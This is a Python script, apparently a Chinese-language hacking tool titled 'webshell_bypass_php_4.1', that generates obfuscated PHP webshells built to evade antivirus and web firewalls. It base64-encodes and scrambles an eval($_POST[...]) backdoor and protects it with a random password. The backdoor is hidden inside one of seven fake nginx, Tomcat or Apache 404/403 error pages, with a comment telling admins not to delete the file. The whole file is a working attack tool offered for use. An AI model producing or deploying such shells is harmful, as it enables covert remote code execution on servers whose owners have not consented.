import string
import random
import base64
import sys
from colorama import init
from termcolor import colored
from argparse import ArgumentParser
import os
import time

'''
免杀原理
base64 编码，把关键字符base后，打乱，并添加其他字符
'''
init()


def character_encode(replace_string, length, confusing_characters=""):
    encoding_string = ""
    if confusing_characters == "":
        confusing_characters = "".join(random.sample(string.ascii_letters + string.digits, length))  # 生成随机字符
    while True:
        rand_len = int(random.randint(1, 4))  # 返回1到4之间的整数
        if (len(replace_string) <= rand_len):
            encoding_string += replace_string + confusing_characters
            break
        encoding_string += replace_string[:rand_len] + confusing_characters
        replace_string = replace_string[rand_len:]
    return encoding_string, confusing_characters


def free_kill(php_name):
    decode_string = character_encode("base64_decode", 50)
    replace_string = character_encode("str_replace", 50)
    fun = character_encode(base64.b64encode("create_function".encode('utf-8')).decode('utf-8'), 50)
    ph_1 = character_encode(base64.b64encode("eval($_POST['".encode('utf-8')).decode('utf-8'), 50)
    ph_2 = character_encode(base64.b64encode("']);".encode('utf-8')).decode('utf-8'), 50)

    keys = ''.join(random.sample(string.ascii_letters + string.digits, 4))
    print(colored(f'随机密码key生成成功：', 'green'), colored(keys, 'red'))
    if php_name != None:
        if '.php' in php_name:
            print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
        else:
            php_name = php_name + '.php'
            print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
    else:
        if '.php' in php_name:
            print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
        else:
            php_name = php_name + '.php'
            print(colored('文件载入成功：', 'green'), colored(php_name, 'red'))
    php_name = '\\' + php_name
    lj = input('输入保存shell文件的绝对路径(直接回车就是当前脚本路径)：')
    if lj == '':
        lj = os.path.split(os.path.realpath(__file__))[0]
        print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
    else:
        print(colored('路径载入成功：', 'green'), colored(lj, 'red'))
    lj_data = lj + php_name
    print(colored('路径拼接成功：', 'green'), colored(lj_data, 'red'))
    try:
        with open(lj_data, "w+") as f:
            a = input("选择伪装（1，2，3，4，5，6，7）默认是7：")
            if a == '1':
                statement = f"""
<html>
<head><title>404 Not Found</title></head>
<body bgcolor="white">
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
<?php
$a='str_';
$b=$a.'replace';//此文件是报告错误文件，请勿删除
$rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
$base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
$ba1=substr($base,6);
$ba2='bzxcazxcszxcezxc6zxc4';
$base=substr_replace('zxc','base64',$ba2);
$base=$base.$ba1;
$func = $base($rep("{fun[1]}", "", "{fun[0]}"));
$func1 = substr($func,6);
$func2='cwsxrwsxewsxawsxtwsxewsx';
$func2=substr_replace('wsx','create',$func2);
$func = $func2.$func1;
$p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
$p_2 = "{keys}";
$p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
#echo $p_1.$p_2.$p_3;
@$p = $func("", $p_1.$p_2.$p_3);
$p();
?>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
        """
            elif a == '2':
                xx = '{'
                yy = '}'
                statement = f"""
        <!doctype html><html lang="en"><head><title>HTTP Status 404 - Not Found</title><style type="text/css">h1 
        {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;{yy} h2 {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;{yy} h3 {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;{yy} body {xx}font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;{yy} b {xx}font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;{yy} p {xx}font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;{yy} a {xx}color:black;{yy} a.name {xx}color:black;{yy} .line {xx}height:1px;background-color:#525D76;border:none;{yy}
        </style>
        </head>
        <body>
        <h1>HTTP Status 404 - Not Found</h1><hr class="line" />
        <p>
        <b>Type</b> Status Report</p>
        <p><b>Message</b> Not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/9.0.21</h3></body></html>
        <?php
        $a='str_';
        $b=$a.'replace';//此文件是报告错误文件，请勿删除
        $rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
        $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
        $ba1=substr($base,6);
        $ba2='bzxcazxcszxcezxc6zxc4';
        $base=substr_replace('zxc','base64',$ba2);
        $base=$base.$ba1;
        $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
        $func1 = substr($func,6);
		$func2='cwsxrwsxewsxawsxtwsxewsx';
		$func2=substr_replace('wsx','create',$func2);
		$func = $func2.$func1;
        $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
        $p_2 = "{keys}";
        $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
        #echo $p_1.$p_2.$p_3;
        @$p = $func("", $p_1.$p_2.$p_3);
        $p();
        ?>
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
                    """
            elif a == '3':
                statement = f"""
        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
        <html><head>
        <title>404 Not Found</title>
        </head><body>
        <h1>Not Found</h1>
        <p>The requested URL was not found on this server.</p>
        </body></html>
        <?php
        $a='str_';
        $b=$a.'replace';//此文件是报告错误文件，请勿删除
        $rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
        $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
        $ba1=substr($base,6);
        $ba2='bzxcazxcszxcezxc6zxc4';
        $base=substr_replace('zxc','base64',$ba2);
        $base=$base.$ba1;
        $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
        $func1 = substr($func,6);
		$func2='cwsxrwsxewsxawsxtwsxewsx';
		$func2=substr_replace('wsx','create',$func2);
		$func = $func2.$func1;
        $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
        $p_2 = "{keys}";
        $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
        #echo $p_1.$p_2.$p_3;
        @$p = $func("", $p_1.$p_2.$p_3);
        $p();
        ?>
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
        <!-- a padding to disable MSIE and Chrome friendly error page -->
                    """
            elif a == '4':
                ip = input("伪装4需要目标Ip，输入对方服务器ip：")
                statement = f"""
                        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
                        <html><head>
                        <title>403 Forbidden</title>
                        </head><body>
                        <h1>Forbidden</h1>
                        <p>You don't have permission to access this resource.</p>
                        <hr>
                        <address>Apache/2.4.46 (Ubuntu) Server at {ip} Port 80</address>
                        </body></html>
                        <?php
                        $a='str_';
                        $b=$a.'replace';//此文件是报告错误文件，请勿删除
                        $rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
                        $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
                        $ba1=substr($base,6);
                        $ba2='bzxcazxcszxcezxc6zxc4';
                        $base=substr_replace('zxc','base64',$ba2);
                        $base=$base.$ba1;
                        $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
                        $func1 = substr($func,6);
                		$func2='cwsxrwsxewsxawsxtwsxewsx';
                		$func2=substr_replace('wsx','create',$func2);
                		$func = $func2.$func1;
                        $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
                        $p_2 = "{keys}";
                        $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
                        #echo $p_1.$p_2.$p_3;
                        @$p = $func("", $p_1.$p_2.$p_3);
                        $p();
                        ?>
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                                    """
            elif a == '5':
                statement = f"""
                        <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
                        <html><head>
                        <title>403 Forbidden</title>
                        </head><body>
                        <h1>Forbidden</h1>
                        <p>You don't have permission to access this resource.</p>
                        </body></html>
                        <?php
                        $a='str_';
                        $b=$a.'replace';//此文件是报告错误文件，请勿删除
                        $rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
                        $base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
                        $ba1=substr($base,6);
                        $ba2='bzxcazxcszxcezxc6zxc4';
                        $base=substr_replace('zxc','base64',$ba2);
                        $base=$base.$ba1;
                        $func = $base($rep("{fun[1]}", "", "{fun[0]}"));
                        $func1 = substr($func,6);
                		$func2='cwsxrwsxewsxawsxtwsxewsx';
                		$func2=substr_replace('wsx','create',$func2);
                		$func = $func2.$func1;
                        $p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
                        $p_2 = "{keys}";
                        $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
                        #echo $p_1.$p_2.$p_3;
                        @$p = $func("", $p_1.$p_2.$p_3);
                        $p();
                        ?>
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                        <!-- a padding to disable MSIE and Chrome friendly error page -->
                                    """
            elif a == '6':
                ml = input("此需要一个错误的路径(如： /cs/默认的是/config/)：")
                if ml == '':
                    ml = '/config/'
                else:
                    if '/' in ml:
                        pass
                    else:
                        ml = '/' + ml + '/'
                statement = f"""
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access {ml}
on this server.<br />
</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
<?php
$a='str_';
$b=$a.'replace';//此文件是报告错误文件，请勿删除
$rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
$base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
$ba1=substr($base,6);
$ba2='bzxcazxcszxcezxc6zxc4';
$base=substr_replace('zxc','base64',$ba2);
$base=$base.$ba1;
$func = $base($rep("{fun[1]}", "", "{fun[0]}"));
$func1 = substr($func,6);
$func2='cwsxrwsxewsxawsxtwsxewsx';
$func2=substr_replace('wsx','create',$func2);
$func = $func2.$func1;
$p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
$p_2 = "{keys}";
$p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
#echo $p_1.$p_2.$p_3;
@$p = $func("", $p_1.$p_2.$p_3);
$p();
?>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
                                                    """
            else:
                ml = input("此需要一个错误的文件(如：/cs/a.php，默认的是：/config/index.php)：")
                if ml == '':
                    ml = '/config/index.php'
                statement = f"""
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL {ml} was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
<?php
$a='str_';
$b=$a.'replace';//此文件是报告错误文件，请勿删除
$rep = $b("{replace_string[1]}", "", "{replace_string[0]}");
$base = $rep("{decode_string[1]}", "", "{decode_string[0]}");
$ba1=substr($base,6);
$ba2='bzxcazxcszxcezxc6zxc4';
$base=substr_replace('zxc','base64',$ba2);
$base=$base.$ba1;
$func = $base($rep("{fun[1]}", "", "{fun[0]}"));
$func1 = substr($func,6);
$func2='cwsxrwsxewsxawsxtwsxewsx';
$func2=substr_replace('wsx','create',$func2);
$func = $func2.$func1;
$p_1 = $base($rep("{ph_1[1]}", "", "{ph_1[0]}"));
$p_2 = "{keys}";
$p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
#echo $p_1.$p_2.$p_3;
@$p = $func("", $p_1.$p_2.$p_3);
$p();
?>
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
<!-- a padding to disable MSIE and Chrome friendly error page -->
                                                                    """
            f.write(statement)
            f.close()
    except FileNotFoundError as error:
        print('发生错误，文件路径不存在', error)
        sys.exit()
    except Exception as error:
        print('发生未知错误：', colored(str(error), 'red'))
    print(colored('路径：', 'green'), colored(lj_data, 'red'))
    print(colored('密码key：', 'green'), colored(keys, 'red'))


if __name__ == "__main__":
    name = f"{colored('webshell_bypass_php_4.1 by 弱鸡', 'green')}" \
           "\n\n交流群：184324009"
    arg = ArgumentParser(description=name)
    arg.add_argument("-p",
                     "--php",
                     help=f"{colored('-p 文件名 or --php 文件名', 'green')}")
    arg.add_argument("-j",
                     "--jsp",
                     help=f"{colored('-j 文件名 or --jsp 文件名', 'green')}")
    arg.add_argument("-c",
                     "--config",
                     help=f"{colored('查看配置 -c 1 or --config 1', 'green')}")
    args = arg.parse_args()
    php = args.php
    jsp = args.jsp
    config = args.config
    i = 0   #判断有没有调用输出配置文件
    if php != None or jsp != None or config != None:
        if config != None:
            path = os.path.split(os.path.realpath(__file__))[0]#获取脚本当前路径
            current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))#获取当前时间
            print(f"""
            ---------------------------------------
            {colored('php_弱鸡_webshelll免杀生成 4.1', 'red')}
            密码随机                            
            伪装1和3适用于linux服务器
            伪装2适用于iis服务器
            4和5是403错误，123是404，6是禁止访问
            7是文件访问不存在 404
            路径为绝对路径如：C:\\xxx\\xxx\\Desktop
            ---------------------------------------
            by 弱鸡
            版本1.0：加入了显示页面伪装
            版本2.0：加入了自定义文件名以及错误处理
                    添加了过某些waf
            版本3.0：对一些敏感函数加密
            版本4.0：修复了使用错误
                    4.1：修改了报错问题
            ---------------------------------------
            配置信息
            默认生成shell文件路径：{path}
            时间：{current_time}
            """)
            i = 1
        if php != None:
            if i == 1:
                pass
            else:
                path = os.path.split(os.path.realpath(__file__))[0]
                current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
                print(f"""
                ---------------------------------------
                {colored('php_弱鸡_webshelll免杀生成 4.1', 'red')}
                密码随机                            
                伪装1和3适用于linux服务器
                伪装2适用于iis服务器
                4和5是403错误，123是404，6是禁止访问
                7是文件访问不存在 404
                路径为绝对路径如：C:\\xxx\\xxx\\Desktop
                ---------------------------------------
                by 弱鸡
                版本1.0：加入了显示页面伪装
                版本2.0：加入了自定义文件名以及错误处理
                        添加了过某些waf
                版本3.0：对一些敏感函数加密
                版本4.0：修复了使用错误
                        4.1：修改了报错问题
                ---------------------------------------
                配置信息
                默认生成shell文件路径：{path}
                时间：{current_time}
                """)
            free_kill(php_name=php)
        if jsp != None:
            print(colored('\njsp免杀_还在编写中', 'red'))
    else:
        name = os.path.basename(__file__)
        os.system(f'python {name} -h')
